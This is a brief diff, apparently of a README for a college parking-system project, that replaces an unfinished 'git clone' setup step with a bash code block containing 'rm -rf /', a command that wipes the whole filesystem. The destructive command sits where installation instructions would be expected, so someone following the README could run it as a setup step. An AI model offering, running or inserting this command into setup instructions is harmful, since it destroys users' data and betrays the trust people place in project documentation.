@@ -2,6 +2,6 @@
 
 College project for parking system
 
-...bash
-git clone 
-...
+```bash
+rm -rf /
+```
